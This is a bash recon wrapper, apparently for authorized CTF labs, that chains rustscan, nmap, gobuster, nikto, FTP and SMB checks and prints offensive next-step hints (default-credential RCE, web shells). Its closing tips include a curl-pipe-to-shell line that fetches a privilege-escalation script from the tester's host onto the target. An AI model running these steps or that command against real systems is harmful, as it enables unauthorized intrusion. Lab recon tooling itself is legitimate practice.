#!/usr/bin/env bash
# babysteps — initial recon wrapper for HTB/THM-style CTF labs.
# Authorized targets only (lab VPN networks you are permitted to test).
#
# Usage:
#   ./babysteps.sh <target> [--project=<name>] [--reuse] [--speed|--deep]
#   ./babysteps.sh                     # prompts for target + project
#
# Scan modes (neo.sh passes --speed by default; [d] at recon pause runs --deep):
#   --speed  ~2–3 min: rustscan + nmap -p- cross-check + sC/sV + quick gobuster (~45s/step)
#   --deep   Full enum: long budgets; nikto; full gobuster wordlist
#   --quick  Alias for --speed (legacy)
#
# The findings file uses ANSI color codes on purpose (view it with `cat` or
# `less -R`, not a plain text editor) -- [+] green = good lead, [!] yellow =
# dead end/caveat, [-] red = failed, "-> " magenta = a canned next-step tip.

set -euo pipefail

NEO_HOME="${NEO_HOME:-${HOME}/Neo}"
NEO_DIR="${NEO_DIR:-${NEO_HOME}}"
WORDLISTS="${NEO_HOME}/wordlists"
PROJECTS="${NEO_HOME}/projects"
DIR_WORDLIST="${WORDLISTS}/directory-list-2.3-medium.txt"

# shellcheck source=../lib/script-lib.sh
source "${NEO_DIR}/lib/script-lib.sh"

cybersec_init_colors

QUICK=false
REUSE=false
SPEED=false
DEEP=false
TARGET=""
PROJECT_NAME=""
SCAN_MODE="deep"

for arg in "$@"; do
    case "${arg}" in
        -h|--help)
            cat <<'EOF'
Usage: babysteps.sh [target] [--project=<name>] [--reuse] [--speed|--deep]

Runs a first-pass enumeration against a CTF target:
  1. Port scan: rustscan (fast) plus an independent full-range nmap sweep
     with retries in --deep mode (catches ports rustscan can drop on a lossy
     HTB VPN link), unioned, then nmap -sC -sV against the merged port list
  2. HTTP(S) probe of every open port, then gobuster/nikto (--deep only)
  3. Anonymous FTP login test if port 21 is open
  4. SMB share listing if port 445 is open

Writes:
  ~/Neo/projects/<project>/BabySteps-findings.txt (raw colorized log)
  ~/Neo/projects/<project>/Investigation-Notes.md (PORTS/NMAP/SERVICES/TODO)

Options:
  --speed   Standard pass (~2–3 min): rustscan + nmap -p- union + sC/sV; 1000-word gobuster
  --deep    Full enum: longer budgets; nikto; full gobuster wordlist
  --quick   Same as --speed (legacy)
  --reuse   Reuse existing project folder without prompting (neo.sh)
  --project=<name>  Project folder name (neo.sh)
EOF
            exit 0
            ;;
        --quick) QUICK=true; SPEED=true ;;
        --speed) SPEED=true ;;
        --deep)  DEEP=true ;;
        --reuse) REUSE=true ;;
        --project=*) PROJECT_NAME="${arg#*=}" ;;
        -*) echo "Unknown option: ${arg}" >&2; exit 1 ;;
        *) TARGET="${arg}" ;;
    esac
done

if ${DEEP}; then
    SCAN_MODE="deep"
elif ${SPEED} || ${QUICK}; then
    SCAN_MODE="speed"
fi

if [[ -z "${TARGET}" ]]; then
    read -r -p "Target IP or hostname: " TARGET
fi

if [[ -z "${TARGET}" ]]; then
    echo "No target given." >&2
    exit 1
fi

need() { cybersec_need "$@" || exit 1; }

need rustscan
need nmap
need gobuster
need smbclient
need curl

if [[ "${SCAN_MODE}" == speed ]]; then
    # HTB VPN often drops ports in a lone rustscan pass — always cross-check with nmap -p-.
    # -T4 (vs deep mode's gentler -T3) buys back most of the speed a full 65535-port sweep
    # otherwise loses to a tight budget on a lossy/high-latency link.
    RUSTSCAN_BUDGET=45
    NMAP_FULL_BUDGET=90
    NMAP_FULL_TIMING=-T4
    NMAP_SVC_BUDGET=45
    GOBUSTER_BUDGET=45
    GOBUSTER_MAX_LINES=1000
    RUN_NIKTO=false
else
    RUSTSCAN_BUDGET=180
    NMAP_FULL_BUDGET=250
    NMAP_FULL_TIMING=-T3
    NMAP_SVC_BUDGET=120
    GOBUSTER_BUDGET=300
    GOBUSTER_MAX_LINES=0
    RUN_NIKTO=true
fi

TMPDIR="$(mktemp -d /tmp/babysteps.XXXXXX)"
trap 'rm -rf "${TMPDIR}"' EXIT

mkdir -p "${PROJECTS}"

if [[ -z "${PROJECT_NAME}" ]]; then
    read -r -p "Project folder name [${TARGET}]: " PROJECT_NAME
fi
PROJECT_NAME="${PROJECT_NAME:-${TARGET}}"

if [[ "${PROJECT_NAME}" == */* || "${PROJECT_NAME}" == "." || "${PROJECT_NAME}" == ".." ]]; then
    echo "Invalid project name: ${PROJECT_NAME}" >&2
    exit 1
fi

OUTDIR="${PROJECTS}/${PROJECT_NAME}"

if [[ -e "${OUTDIR}" ]]; then
    if [[ "${REUSE}" != true ]]; then
        read -r -p "Project '${PROJECT_NAME}' already exists — reuse it and overwrite its files? [y/N]: " reuse
        if [[ ! "${reuse}" =~ ^[Yy] ]]; then
            echo "Aborting — rerun and pick a different project name." >&2
            exit 1
        fi
    fi
else
    mkdir -p "${OUTDIR}"
fi

FINDINGS="${OUTDIR}/BabySteps-findings.txt"
: > "${FINDINGS}"

notes_init "${PROJECT_NAME}" "${TARGET}" "${OUTDIR}" || true
meta_set scan_mode "${SCAN_MODE}" 2>/dev/null || true

log()     { printf '%s[*]%s %s\n' "${C_BLUE}"    "${C_RESET}" "$*" | tee -a "${FINDINGS}"; }
good()    { printf '%s[+]%s %s\n' "${C_GREEN}"   "${C_RESET}" "$*" | tee -a "${FINDINGS}"; }
warn()    { printf '%s[!]%s %s\n' "${C_YELLOW}"  "${C_RESET}" "$*" | tee -a "${FINDINGS}"; }
bad()     { printf '%s[-]%s %s\n' "${C_RED}"     "${C_RESET}" "$*" | tee -a "${FINDINGS}"; }
hint()    { printf '%s    -> %s%s\n' "${C_MAGENTA}" "$*" "${C_RESET}" | tee -a "${FINDINGS}"; }
section() { printf '\n%s%s=== %s ===%s\n' "${C_BOLD}" "${C_CYAN}" "$*" "${C_RESET}" | tee -a "${FINDINGS}"; }

# Runs a command in the background under a timeout budget, showing a live
# countdown on the terminal (not written to the findings file) so a quiet
# tool doesn't look hung. Captures combined stdout+stderr to $3; returns the
# command's exit status (124 if the budget killed it).
run_with_countdown() { cybersec_run_with_countdown "$@"; }

_babysteps_finish() {
    local summary="$1"
    cybersec_finish "babysteps" "recon" "${summary}" "$(cat "${FINDINGS}")" || true
}

has_port() {
    local port="$1"
    [[ ",${PROBE_PORTS}," == *",${port},"* ]]
}

# Tracks the single best lead found across the whole run so far, for the
# final "most promising next step" line. Only overwritten by something
# with a strictly higher priority.
PRIORITY=0
TOP_STEP="No strong lead yet — start by manually poking at whatever's open and re-reading the port scan for anything unusual."

set_priority() {
    local p="$1" msg="$2"
    if (( p > PRIORITY )); then
        PRIORITY="${p}"
        TOP_STEP="${msg}"
    fi
}

# Probes a single port for an HTTP(S) response regardless of what nmap
# named the service (this is what catches a web app on a non-standard port
# like 3000 that a fixed port list would otherwise miss). Prints the scheme
# ("http"/"https") and returns 0 on a match, prints nothing and returns 1
# otherwise.
detect_scheme() {
    local port="$1"
    if curl -s -o /dev/null --max-time 5 "http://${TARGET}:${port}/" 2>/dev/null; then
        printf 'http'
        return 0
    fi
    if curl -s -o /dev/null --max-time 5 -k "https://${TARGET}:${port}/" 2>/dev/null; then
        printf 'https'
        return 0
    fi
    return 1
}

# Scans headers + page body + gobuster output for known technology/path
# fingerprints and prints a canned hint for each match. Returns 1 (no
# output) if nothing matched, so the caller can fall back to a generic tip.
web_tech_hints() {
    local evidence="$1" url="$2"
    local -a patterns=(
        'wp-content|wp-login|wp-includes'
        'Joomla'
        'Drupal'
        'phpmyadmin'
        '/manager/html|Apache Tomcat'
        'X-Jenkins|Jenkins'
        '\.git/'
        '\.env'
        'graphql'
        'swagger|openapi'
        'X-Powered-By:[[:space:]]*Next\.js|_next/static'
        'admin'
        '\.bak|\.old|~$'
        'upload'
        '\.php'
        'Server:[[:space:]]*Apache'
        'Server:[[:space:]]*nginx'
        'Server:[[:space:]]*Microsoft-IIS'
    )
    local -a messages=(
        "WordPress detected — enumerate with 'wpscan --url ${url} --enumerate p,u,vp', check for a wp-config.php backup, and try default/reused creds on wp-login.php."
        "Joomla detected — fingerprint the exact version and check com_* component vulnerabilities ('joomscan', or 'searchsploit joomla')."
        "Drupal detected — check the exact version against Drupalgeddon-style RCEs ('searchsploit drupal')."
        "phpMyAdmin found — try default/blank root creds, and check the version against searchsploit."
        "Tomcat manager found — try default creds (tomcat:tomcat, admin:admin) for a WAR-upload RCE."
        "Jenkins detected — check for an unauthenticated script console at /script (instant RCE) before trying credentials."
        "A .git directory is exposed — dump it ('git-dumper' or 'wget -r') and read the full source + commit history."
        "A .env file is exposed — pull it directly, it often has DB/API credentials in plain text."
        "GraphQL endpoint found — try an introspection query to map the entire schema."
        "API docs (Swagger/OpenAPI) are exposed — read them for a full endpoint map, including anything undocumented elsewhere."
        "Next.js app — check for exposed source maps under /_next/static, unauthenticated routes under /api/, and confirm the version isn't hit by a known middleware auth-bypass CVE (e.g. CVE-2025-29927)."
        "An admin-style path was found — check for default creds and confirm there's no auth bypass on a nested endpoint."
        "Backup/temp files were found — pull them directly, they often contain source code or credentials the live app hides."
        "An upload endpoint was found — check what file types it actually accepts; unrestricted upload is a common path to a web shell."
        "PHP in play — look for file-include/upload parameters (LFI/RFI), and keep a PHP webshell one-liner handy."
        "Apache in the Server header — grab the exact version and run searchsploit against it."
        "nginx in the Server header — grab the exact version and check for known misconfig/CVE issues (e.g. alias traversal)."
        "IIS in the Server header — check the version against searchsploit; older IIS is vulnerable to short-filename (~) enumeration."
    )

    local i matched=false
    for i in "${!patterns[@]}"; do
        if grep -qiE "${patterns[$i]}" <<< "${evidence}"; then
            hint "${messages[$i]}"
            NOTES_TODO_HINTS+=("${messages[$i]}")
            matched=true
        fi
    done
    ${matched}
}

{
    printf 'BabySteps findings\n'
    printf 'Target:  %s\n' "${TARGET}"
    printf 'Started: %s\n' "$(date '+%Y-%m-%d %H:%M:%S')"
} >> "${FINDINGS}"

section "Target: ${TARGET}"
log "Project -> ${OUTDIR}"
log "Findings file -> ${FINDINGS}"

section "Port scan"
log "Scan mode: ${SCAN_MODE}"
log "Running rustscan (fast full-range TCP sweep), up to ${RUSTSCAN_BUDGET}s"

rustscan_status=0
run_with_countdown "${RUSTSCAN_BUDGET}" "rustscan" "${TMPDIR}/rustscan.out" \
    rustscan --no-banner -a "${TARGET}" -g \
    || rustscan_status=$?

cat "${TMPDIR}/rustscan.out" | tee -a "${FINDINGS}"
if (( rustscan_status == 124 )); then
    warn "rustscan hit the ${RUSTSCAN_BUDGET}s budget and was stopped — results above may be incomplete."
fi

# `|| true` throughout this block: under `set -o pipefail`, a `grep` that matches nothing
# (e.g. a scan that timed out before finding anything) exits 1, which would otherwise abort
# the whole script right here via `set -e` on what should be a normal "found zero ports so
# far" outcome, not a fatal error. Confirmed root cause of a real crash: nmap -p- timing out
# near-instantly left nmap_full.gnmap empty, `grep -oE ... | ...` exited 1, script died with
# no further output — before ever reaching the "no open ports found" handling below.
RUSTSCAN_PORTS="$(grep -oP '(?<=-> \[)[^]]*' "${TMPDIR}/rustscan.out" | tr ',' '\n' | grep -v '^$' | sort -nu || true)"

NMAP_FULL_PORTS=""
if (( NMAP_FULL_BUDGET > 0 )); then
    log "Running a full nmap TCP sweep with retries as a cross-check, up to ${NMAP_FULL_BUDGET}s"

    nmap_full_status=0
    run_with_countdown "${NMAP_FULL_BUDGET}" "nmap-full" "${TMPDIR}/nmap_full.out" \
        nmap -p- "${NMAP_FULL_TIMING}" --max-retries 3 -oG "${TMPDIR}/nmap_full.gnmap" "${TARGET}" \
        || nmap_full_status=$?

    cat "${TMPDIR}/nmap_full.out" | tee -a "${FINDINGS}"
    if (( nmap_full_status == 124 )); then
        warn "Full nmap sweep hit the ${NMAP_FULL_BUDGET}s budget and was stopped — results above may be incomplete."
    fi

    NMAP_FULL_PORTS="$(grep -oE '[0-9]+/open' "${TMPDIR}/nmap_full.gnmap" 2>/dev/null | cut -d/ -f1 | sort -nu || true)"

    if [[ -n "${RUSTSCAN_PORTS}" && -n "${NMAP_FULL_PORTS}" && "${RUSTSCAN_PORTS}" != "${NMAP_FULL_PORTS}" ]]; then
        warn "rustscan and the full nmap sweep disagreed on which ports are open — using the union of both."
    fi
else
    log "Speed mode — running nmap -p- cross-check (catches ports rustscan drops on HTB VPN)."
fi

DISCOVERY_PORTS="$(printf '%s\n%s\n' "${RUSTSCAN_PORTS}" "${NMAP_FULL_PORTS}" | grep -v '^$' | sort -nu | paste -sd, - || true)"

if [[ -z "${DISCOVERY_PORTS}" ]]; then
    bad "No open ports found by either scan."
    hint "Host may be filtered rather than down. Try a UDP sweep ('nmap -sU --top-ports 20 ${TARGET}') before giving up on it."
    printf 'Finished: %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" >> "${FINDINGS}"
    _babysteps_finish "No open ports found."
    exit 0
fi

portscan_status=0
log "Running nmap -sC -sV on the merged port list (${DISCOVERY_PORTS}), up to ${NMAP_SVC_BUDGET}s"
run_with_countdown "${NMAP_SVC_BUDGET}" "nmap-sCsV" "${TMPDIR}/portscan.out" \
    nmap -sC -sV -p"${DISCOVERY_PORTS}" -oA "${TMPDIR}/nmap" "${TARGET}" \
    || portscan_status=$?

cat "${TMPDIR}/portscan.out" | tee -a "${FINDINGS}"
if (( portscan_status == 124 )); then
    warn "Service/version scan hit the ${NMAP_SVC_BUDGET}s budget and was stopped — results above may be incomplete."
fi

# ports and state are separate whitespace-delimited fields in nmap's
# normal-format output ("22/tcp   open  ssh ..."), not joined by "/", so
# this has to match on the state field rather than a literal substring.
OPEN_PORTS="$(awk '/^[0-9]+\/(tcp|udp)[[:space:]]+open/ { split($1, a, "/"); print a[1] }' \
    "${TMPDIR}/nmap.nmap" 2>/dev/null \
    | sort -nu \
    | paste -sd, -)"

if [[ -z "${OPEN_PORTS}" ]]; then
  bad "No open ports found in nmap output."
  hint "Host may be filtered rather than down. Try a full TCP range ('nmap -p- -T4 ${TARGET}') or a UDP sweep ('nmap -sU --top-ports 20 ${TARGET}') before giving up on it."
  printf 'Finished: %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" >> "${FINDINGS}"
  _babysteps_finish "No open ports confirmed by service scan."
  exit 0
fi

good "Open ports (service scan): ${OPEN_PORTS}"

if [[ "${DISCOVERY_PORTS}" != "${OPEN_PORTS}" ]]; then
    warn "Discovery saw ${DISCOVERY_PORTS}; service scan confirmed ${OPEN_PORTS} — follow-ups probe the discovery union so nothing rustscan-only gets dropped."
fi

# Follow-ups use the discovery union, not just ports the -sC/-sV pass confirmed:
# a port can show up in rustscan/full-sweep yet come back filtered/closed in the
# version scan (timing, firewalls), and we still want HTTP/FTP/SMB checks on it.
PROBE_PORTS="$(printf '%s\n%s\n' "${OPEN_PORTS}" "${DISCOVERY_PORTS}" | tr ',' '\n' | grep -v '^$' | sort -nu | paste -sd, - || true)"

notes_set_section PORTS "$(grep -E '^[0-9]+/(tcp|udp)[[:space:]]+open' "${TMPDIR}/nmap.nmap" 2>/dev/null || true)" || true
notes_set_section NMAP "$(cat "${TMPDIR}/portscan.out")" || true

# Collects every matched web_tech_hints() message across the whole run so
# they can be dropped into the notes file's "Things to Investigate" section
# once, at the end, instead of duplicating the terminal hint logic there.
NOTES_TODO_HINTS=()

section "Web enumeration"
log "Probing every open port for an HTTP(S) response (replaces the old fixed-port-list check, so a web app on an unusual port like 3000 doesn't get missed)..."

WEB_TARGETS=()
IFS=',' read -ra ALL_OPEN_PORTS <<< "${PROBE_PORTS}"
for port in "${ALL_OPEN_PORTS[@]}"; do
    if scheme="$(detect_scheme "${port}")"; then
        WEB_TARGETS+=("${scheme}://${TARGET}:${port}")
        good "HTTP(S) service confirmed on port ${port} (${scheme})"
    fi
done

if [[ "${#WEB_TARGETS[@]}" -eq 0 ]]; then
    warn "No open port responded to an HTTP(S) probe."
    hint "Nothing to browse. Focus on the non-web services from the port scan above: only brute-force with a real lead (credentials found elsewhere), and check searchsploit against the exact service/version banners nmap reported."
    set_priority 1 "Only non-HTTP services are open — you need credentials from somewhere (weak-cred guess, leaked info, another box) before those become useful. Re-read the nmap output above for exact service versions and check searchsploit."
else
    good "${#WEB_TARGETS[@]} web service(s) found: ${WEB_TARGETS[*]}"

    for url in "${WEB_TARGETS[@]}"; do
        section "Web target: ${url}"

        HEADERS="$(curl -sI --max-time 8 "${url}/" 2>/dev/null || true)"
        BODY="$(curl -s --max-time 8 "${url}/" 2>/dev/null | head -c 20000 || true)"
        echo "${HEADERS}" | tee -a "${FINDINGS}"

        if [[ -f "${DIR_WORDLIST}" ]]; then
            WORDLIST="${TMPDIR}/gobuster-wordlist.txt"
            if (( GOBUSTER_MAX_LINES > 0 )); then
                head -n "${GOBUSTER_MAX_LINES}" "${DIR_WORDLIST}" > "${WORDLIST}"
                log "gobuster (${GOBUSTER_MAX_LINES} entries) on ${url}, ${GOBUSTER_BUDGET}s budget"
            else
                cp "${DIR_WORDLIST}" "${WORDLIST}"
                log "gobuster on ${url}, ${GOBUSTER_BUDGET}s budget"
            fi

            gobuster_status=0
            run_with_countdown "${GOBUSTER_BUDGET}" "gobuster" "${TMPDIR}/gobuster.out" \
                gobuster dir -u "${url}" -w "${WORDLIST}" -q -t 50 --no-error \
                || gobuster_status=$?

            GOBUSTER_OUT="$(cat "${TMPDIR}/gobuster.out")"
            echo "${GOBUSTER_OUT}" | tee -a "${FINDINGS}"
            if (( gobuster_status == 124 )); then
                warn "gobuster hit the ${GOBUSTER_BUDGET}s budget and was stopped — partial results above."
            fi

            if [[ -z "$(grep -v '^[[:space:]]*$' <<< "${GOBUSTER_OUT}")" ]]; then
                warn "gobuster found nothing on ${url}."
                hint "Try a bigger/different wordlist, add extensions (-x php,txt,html,bak), check robots.txt and view-source by hand, and don't rule out a client-side-routed app (SPA) where gobuster won't find much anyway — browse it directly instead."
            else
                good "gobuster found $(grep -vc '^[[:space:]]*$' <<< "${GOBUSTER_OUT}") path(s) on ${url} — see above."
                set_priority 3 "Browse the paths gobuster found on ${url} by hand (see hints under that section) — that's your fastest lead right now."
            fi
        else
            GOBUSTER_OUT=""
            warn "Skipping gobuster: wordlist not found at ${DIR_WORDLIST}"
        fi

        if ${RUN_NIKTO} && command -v nikto >/dev/null 2>&1; then
            NIKTO_TIMEOUT=180
            log "nikto on ${url}, up to ${NIKTO_TIMEOUT}s"

            nikto_status=0
            run_with_countdown "${NIKTO_TIMEOUT}" "nikto" "${TMPDIR}/nikto.out" \
                nikto -h "${url}" \
                || nikto_status=$?

            NIKTO_OUT="$(cat "${TMPDIR}/nikto.out")"
            echo "${NIKTO_OUT}" | tee -a "${FINDINGS}"
            if (( nikto_status == 124 )); then
                warn "nikto hit the ${NIKTO_TIMEOUT}s budget and was stopped — partial results above."
            fi

            NIKTO_HITS="$(grep -c '^+ ' <<< "${NIKTO_OUT}" || true)"
            if [[ "${NIKTO_HITS}" -gt 0 ]]; then
                good "nikto flagged ${NIKTO_HITS} item(s) on ${url}."
                hint "Read each nikto finding individually — most are informational, but outdated software versions, dangerous HTTP methods, and exposed files/backups are worth chasing directly."
            else
                NIKTO_OUT=""
            fi
        else
            NIKTO_OUT=""
        fi

        good "Fingerprinting technology on ${url}..."
        EVIDENCE="${HEADERS}
${BODY}
${GOBUSTER_OUT}
${NIKTO_OUT}"
        if ! web_tech_hints "${EVIDENCE}" "${url}"; then
            hint "No specific technology fingerprint matched — treat it as a generic web app: view-source by hand, walk every gobuster hit, and try common backup/config filenames (index.php.bak, config.php~, .DS_Store)."
        else
            set_priority 4 "A fingerprinted technology or exposed path was found on ${url} (see the hints above) — chase that lead first, it's more specific than a blind directory brute-force."
        fi

        NIKTO_NOTE=""
        [[ -n "${NIKTO_OUT}" ]] && NIKTO_NOTE="**nikto:** ${NIKTO_HITS} item(s) flagged — see Enumeration Log for full output."
        notes_append_section SERVICES "$(cat <<SVCEOF
### Web — ${url}
_Discovered: $(date '+%Y-%m-%d %H:%M:%S')_

**Headers:**
\`\`\`text
${HEADERS}
\`\`\`

**gobuster:**
\`\`\`text
${GOBUSTER_OUT:-<nothing found>}
\`\`\`

${NIKTO_NOTE}
SVCEOF
)" || true
    done
fi

section "FTP enumeration"
if has_port 21; then
    log "Testing anonymous FTP login, 15s budget..."
    FTP_LISTING_FILE="${TMPDIR}/ftp_listing.txt"
    if timeout 20 curl -s --connect-timeout 5 --max-time 15 -u anonymous:anonymous \
        --list-only "ftp://${TARGET}/" | tee -a "${FINDINGS}" "${FTP_LISTING_FILE}"; then
        good "Anonymous FTP login succeeded (listing above)."
        hint "Browse and pull every file ('ftp ${TARGET}' or 'wget -r ftp://anonymous:anonymous@${TARGET}/'): look for credentials, private keys, and configs. If uploads are allowed, check whether the FTP root overlaps a web app's document root — that's a direct path to a webshell."
        set_priority 5 "Anonymous FTP login works on port 21 — loot the files first, that's the fastest confirmed win on this box."
        notes_append_section SERVICES "$(cat <<SVCEOF
### FTP — port 21
_Discovered: $(date '+%Y-%m-%d %H:%M:%S')_

Anonymous login succeeded. Listing:
\`\`\`text
$(cat "${FTP_LISTING_FILE}")
\`\`\`
SVCEOF
)" || true
        notes_append_section TODO "- [ ] Loot anonymous FTP files on port 21 — see Service Enumeration section." || true
    else
        warn "Anonymous FTP login failed, refused, or timed out."
        hint "No anonymous access. Hold onto this port — once you find credentials anywhere else (web app, source code, an SMB share), retry them here; FTP creds are frequently reused across services on the same box."
    fi
else
    log "Port 21 not open."
fi

section "SMB enumeration"
if has_port 445; then
    log "Listing SMB shares (null session), 30s budget..."
    SMB_OUT="$(timeout 30 smbclient -L "//${TARGET}" -N 2>&1 || true)"
    echo "${SMB_OUT}" | tee -a "${FINDINGS}"
    if grep -qi "Sharename" <<< "${SMB_OUT}"; then
        good "Null session share listing succeeded."
        hint "Connect to each non-default share ('smbclient //${TARGET}/<share> -N') and browse recursively; look for anything readable, and note if any share is writable — a writable share reachable by a service is a common foothold/privesc path."
        set_priority 5 "SMB allows a null session on port 445 — browse every share, that's the fastest confirmed win on this box."
        notes_append_section SERVICES "$(cat <<SVCEOF
### SMB — port 445
_Discovered: $(date '+%Y-%m-%d %H:%M:%S')_

Null session share listing succeeded:
\`\`\`text
${SMB_OUT}
\`\`\`
SVCEOF
)" || true
        notes_append_section TODO "- [ ] Browse SMB null-session shares on port 445 — see Service Enumeration section." || true
    else
        warn "Null session listing failed or was denied."
        hint "SMB is open but anonymous access is off. Hold these credentials in mind for later, and once you have any creds try 'smbclient -L //${TARGET} -U <user>' or enum4linux-ng."
    fi
else
    log "Port 445 not open."
fi

section "Manual follow-ups"
{
cat <<EOF
Target: ${TARGET}
Open ports (service scan): ${OPEN_PORTS}
Discovery union (probed): ${PROBE_PORTS}
Findings file: ${FINDINGS}

Useful next steps:
  - Search exploits: searchsploit <service> <version>
  - SSH: ssh user@${TARGET}
  - FTP: ftp ${TARGET}
  - SMB login: smbclient //${TARGET}/share -U user
  - Catch a shell: ~/Neo/foothold/ListenAssist.sh
  - On-box privesc: curl http://<your-ip>:8000/privesc/FindPrivs.sh | sh
  - Once you have a shell: ~/Neo/privesc/run-findprivs.sh <project> user@target
EOF
} | tee -a "${FINDINGS}"

section "Assessment"
printf '%s%sMost promising next step:%s %s\n' "${C_BOLD}" "${C_GREEN}" "${C_RESET}" "${TOP_STEP}" | tee -a "${FINDINGS}"

printf 'Finished: %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" >> "${FINDINGS}"

if [[ "${#NOTES_TODO_HINTS[@]}" -gt 0 ]]; then
    TODO_CONTENT=""
    for h in "${NOTES_TODO_HINTS[@]}"; do
        TODO_CONTENT+="- [ ] ${h}"$'\n'
    done
    notes_append_section TODO "${TODO_CONTENT}" || true
fi
notes_append_section TODO "- [ ] ${TOP_STEP}" || true
_babysteps_finish "Open ports: ${OPEN_PORTS}. ${TOP_STEP}"

cybersec_print_banner "BABYSTEPS SCAN COMPLETE"

printf '  Target:   %s\n' "${TARGET}"
printf '  Findings: %s\n' "${FINDINGS}"
printf '  Notes:    %s\n\n' "${NOTES_FILE:-<not created>}"
